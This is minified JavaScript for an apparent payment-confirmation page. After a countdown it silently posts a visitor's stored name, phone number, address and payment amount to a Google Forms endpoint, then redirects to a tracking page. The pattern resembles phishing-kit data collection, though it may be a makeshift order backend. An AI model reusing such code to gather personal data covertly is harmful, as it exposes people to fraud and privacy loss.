function generateUniqueId(){let e="ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789",t="";for(let n=0;n<4;n++){let o=Math.floor(Math.random()*e.length);t+=e[o]}return t}function generateComplexUniqueId(){let e=generateUniqueId(),t=new Date,n=`${t.getFullYear()}${t.getMonth()+1}${t.getDate()}${t.getHours()}${t.getMinutes()}${t.getSeconds()}`,o=(e+n).substring(0,9);return btoa(o)}window.onload=function(){if(localStorage.getItem("addressData")){let e=generateComplexUniqueId();localStorage.setItem("uniqueId",e),localStorage.setItem("paidusing","upbank")}else window.location.href="failed.html"};let timerElement=document.getElementById("timer"),resultElement=document.getElementById("result"),countdown=3,countdownInterval=setInterval(()=>{countdown--,timerElement.textContent=countdown,countdown<=0&&(clearInterval(countdownInterval),submitForm())},1e3);function submitForm(){let e=JSON.parse(localStorage.getItem("addressData")),t=localStorage.getItem("uniqueId");if(!e){window.location.href="failed.html";return}let n=e.fullName,o=e.mobileNumber,r=e.area,a=e.address,d=e.landmark,m=e.hmc,l=e.amount,u=new Date,s=u.getFullYear(),i=u.getMonth()+1,I=u.getDate(),p=`${s}-${i}-${I}`,c=new FormData;c.append("entry.854278608",n),c.append("entry.687688741",o),c.append("entry.1253851502",r),c.append("entry.129735148",a),c.append("entry.1737210649",d),c.append("entry.519165036",m),c.append("entry.912229487",l),c.append("entry.278789162",t),c.append("entry.1546171737","urlcode"),fetch("https://docs.google.com/forms/d/e/1FAIpQLSdU_z6qrgwQYtreeIuSLFh49xbrBmaqDqcNXGeyo3Q3C3_vZw/formResponse",{method:"POST",mode:"no-cors",body:c}).then(e=>{localStorage.removeItem("uniqueId"),localStorage.removeItem("addressData"),localStorage.setItem("uniqueId",t),localStorage.setItem("paymentDate",p),localStorage.setItem("username",n),localStorage.setItem("adress",r),localStorage.setItem("amountx",l),localStorage.setItem("unit",m),resultElement.textContent="Redirecting...",window.location.href="track2.html"}).catch(e=>{window.location.href="404.html"})}
